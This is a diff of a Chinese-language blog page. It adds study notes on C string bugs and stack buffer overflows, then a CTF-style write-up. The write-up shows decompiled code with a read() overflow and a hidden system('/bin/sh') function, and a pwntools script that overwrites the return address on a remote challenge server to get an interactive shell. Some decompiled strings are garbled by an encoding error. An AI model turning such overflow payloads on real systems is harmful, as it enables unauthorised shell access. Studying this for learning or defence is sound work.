+<p><strong>字符串类型</strong>：C语言中字符串常量类型为int<br>以下结果是4,1.告诉我们C语言中神奇的存储，我以前都没怎么注意说实话…<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">#include&lt;stdio.h&gt;</div><div class="line">#include&lt;string.h&gt;</div><div class="line">#include&lt;stdlib.h&gt;</div><div class="line">#define  x &apos;a&apos;</div><div class="line">int main()</div><div class="line">&#123;</div><div class="line">	char a[1];</div><div class="line">	printf(&quot;%ld\n&quot;,sizeof(x));</div><div class="line">	printf(&quot;%ld\n&quot;,sizeof(a));</div><div class="line">	return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p><strong>计算字符串大小</strong><br>strlen函数是我们经常用来计算字符串元素个数的，但是如果应用于宽字节，就会导致错误。strlen函数一旦遇到空字节就判断字符串结束，但是宽字符包含空字节。所以会产生错误。</p>
+<blockquote>
+<p>字符串的常见错误</p>
+</blockquote>
+<p>最常见的字符串错误：无界字符串复制错误，差一错误，空结尾错误，字符串截断错误。</p>
+<p>一、无界字符串复制<br>例如gets就是一个很麻烦的例子。<br>当定义数组小于输入字符串时，就会发生错误。<br>同样的，命令行参数输入，如果复制进定义的数组，但是定义数组空间不够的话，就会发生错误。</p>
+<p>二、差一错误<br>与数组越界类似，预定数组长度不够的情况下会发生。</p>
+<p>三、空字符结尾错误<br>指的是字符串数组没有以正确的空字符结尾。<br>比如，strncpy复制不超过n个字符，很可能为复制进空字符结尾，这样会导致数组很大很大，超过想象，那么对另一个数组进行操作时，就会发生错误。有时候编译器不会告诉你错误，但是漏洞就会存在。</p>
+<p>四、字符串截断<br>数组长度不足以容纳一个字符串的内容时，会发生字符串截取，程序员为了防止缓冲区溢出，可能会用到字符串截取，有可能会导致丢失数据或者出现漏洞。</p>
+<p>五、与函数无关的字符串错误<br>这个我感觉发生的概率比前几个高。<br>简略版代码：（略略略）buff[128] buff[i]=a[i] buff[i]=’\0’</p>
+<blockquote>
+<p>字符串漏洞及其利用</p>
+</blockquote>
+<p><strong>一、缓冲区溢出</strong><br>名字虽然很高深的样子，其实就是数组或者特定分配的内存空间外写进数据，就称为缓冲区溢出。未进行隐式的边界检查。</p>
+<p><strong>二、栈管理及栈溢出</strong><br><em>基本概念</em>：从C语言来说就是 <em>先进后出</em> 的某个对内存的操作后的内存（= =）<br>一般来说，弹 <em>出栈</em> 意味着栈指针需要 <em>递增</em> 。栈在压入变量之后一般还会在最后压入返回地址，这意味着一旦这一段结束即可返回。（可能是错的，只是暂时的总结）<br><em>栈溢出</em>：由于栈在内存中按顺序存储，一个栈可能存储许多不同类型的数据，包括变量，指针，地址等等。如果用户恶意输入，很可能使得数据泄露或者越过某些数据检验。比如，简单的弧注入攻击。<br><em>代码注入</em>：被恶意注入的代码也叫外壳代码，攻击者往往利用某个子例程的返回地址导致栈混乱，从而获取该程序相同的权限，如果是root权限，即是开一个远程shell，获取最高权限。<br>恶意参数的特征：（感觉很有趣）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">有漏洞的程序必须接受它作为合法的输入</div><div class="line">参数，以及其他可控制的输入，必须导致有漏洞的代码路径得到执行</div><div class="line">参数不能在程序将控制权转移到shellcode之前导致程序异常中止</div></pre></td></tr></table></figure>
+<h2 id="个人觉得第一点是程序写的不好，第二点是你输入的恶意参数必须能干点事，第三点就是你不能输入的参数直接把程序搞崩。"><a href="#个人觉得第一点是程序写的不好，第二点是你输入的恶意参数必须能干点事，第三点就是你不能输入的参数直接把程序搞崩。" class="headerlink" title="个人觉得第一点是程序写的不好，第二点是你输入的恶意参数必须能干点事，第三点就是你不能输入的参数直接把程序搞崩。"></a>个人觉得第一点是程序写的不好，第二点是你输入的恶意参数必须能干点事，第三点就是你不能输入的参数直接把程序搞崩。</h2><blockquote>
+<p>题目</p>
+</blockquote>
+<p>给出了a.out<br>第一步，反汇编。核心代码如下。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div></pre></td><td class="code"><pre><div class="line">一、</div><div class="line">int __cdecl main(int argc, const char **argv, const char **envp)</div><div class="line">&#123;</div><div class="line">  _x86_get_pc_thunk_ax();</div><div class="line">  vul();</div><div class="line">  return 0;</div><div class="line">&#125;</div><div class="line"></div><div class="line">二、</div><div class="line">void vul()</div><div class="line">&#123;</div><div class="line">  char a[100]; // [sp+Ch] [bp-6Ch]@1</div><div class="line"></div><div class="line">  puts(&quot;--------------------------------------------------------------------------&quot;);</div><div class="line">  printf(</div><div class="line">    &quot;杩欎釜绋嬪簭閲岄潰鏈変釜鍙埍鐨勫皬濮愬锛屽ス鍦08p,浣嗘槸涓囨伓鐨勭帇灏忓悰涓嶄細璋冪敤濂癸紝鐣ョ暐鐣ワ紒\n&quot;,</div><div class="line">    xiaoxiannv);</div><div class="line">  fflush(0);</div><div class="line">  puts(&quot;     缁欎綘涓満浼氾紝璁╀綘璇村彞璇濓紝瑕佹槸浣犺兘鎰熷姩灏忓悰锛岄偅涔堝氨璁╀綘鍜屽皬濮愬瀵硅瘽锛);</div><div class="line">  puts(&quot;--------------------------------------------------------------------------&quot;);</div><div class="line">  fflush(0);</div><div class="line">  read(0, a, 0x3E8u);</div><div class="line">  puts(&quot;emmmmm锛屼笉鏁㈠姩锛屼竴鐐归兘涓嶆暍鍔紒&quot;);</div><div class="line">&#125;</div><div class="line"></div><div class="line">三、</div><div class="line">void xiaoxiannv()</div><div class="line">&#123;</div><div class="line">  int v0; // eax@1</div><div class="line"></div><div class="line">  v0 = _x86_get_pc_thunk_ax();</div><div class="line">  system(&amp;aBinSh[v0 - 134513874]);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>main函数中跳转到vul函数，重点关注read(0, a, 0x3E8u)这句话，这个是把a的大小放入内存，这样就容易造成栈溢出。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">#!/usr/bin/env python</div><div class="line"></div><div class="line">from pwn import *</div><div class="line">payload = &apos;a&apos;*112+p32(0x80484c6)</div><div class="line">p = remote(&apos;121.42.189.18&apos;,5009)</div><div class="line">p.sendline(payload)</div><div class="line">p.interactive()</div><div class="line">print p.recvall()</div></pre></td></tr></table></figure>
+<p>由char a[100]; // [sp+Ch] [bp-6Ch]@1可知，a的实际内存大小为108再加上ebp的大小一共为112。再跳到xiaoxiannv那个函数。<br>再就是关于linux命令的知识了。</p>
+<hr>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
   </section>
 
   
   <nav class="pagination">
-    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><span class="space">&hellip;</span><a class="page-number" href="/page/4/">4</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right"></i></a>
+    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right"></i></a>
   </nav>
 
 
@@ -1794,7 +1848,7 @@
             
               <a href="/archives">
             
-                <span class="site-state-item-count">32</span>
+                <span class="site-state-item-count">25</span>
                 <span class="site-state-item-name">日志</span>
               </a>
             </div>
@@ -1805,7 +1859,7 @@
             
             <div class="site-state-item site-state-categories">
               <a href="/categories/index.html">
-                <span class="site-state-item-count">12</span>
+                <span class="site-state-item-count">9</span>
                 <span class="site-state-item-name">分类</span>
               </a>
             </div>
@@ -1816,7 +1870,7 @@
             
             <div class="site-state-item site-state-tags">
               <a href="/tags/tags.html">
-                <span class="site-state-item-count">12</span>
+                <span class="site-state-item-count">9</span>
                 <span class="site-state-item-name">标签</span>
               </a>
             </div>
